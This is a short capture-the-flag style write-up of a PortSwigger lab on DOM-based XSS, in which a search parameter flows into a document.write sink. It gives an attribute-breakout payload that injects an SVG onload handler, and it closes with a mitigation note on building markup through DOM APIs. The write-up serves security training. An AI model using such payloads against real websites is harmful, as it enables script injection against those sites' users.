# Lab 03 — DOM XSS in document.write sink using source location.search

> **Apprentice** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**Entry point:** `GET /?search=` — passed into a `document.write` sink that
builds an `<img src="...?searchTerms=QUERY">` element.

## Solution

1. Note that the search term is concatenated inside the `src` attribute of an
   `<img>` written by `document.write`.
2. Break out of the attribute and inject a new element:

```
"><svg onload=alert(1)>
```

Resulting markup: `<img src="...searchTerms="><svg onload=alert(1)>">` —
the SVG fires immediately.

## Mitigation

Never build HTML with string concatenation; assign trusted values via DOM
APIs (`createElement`, `setAttribute`).
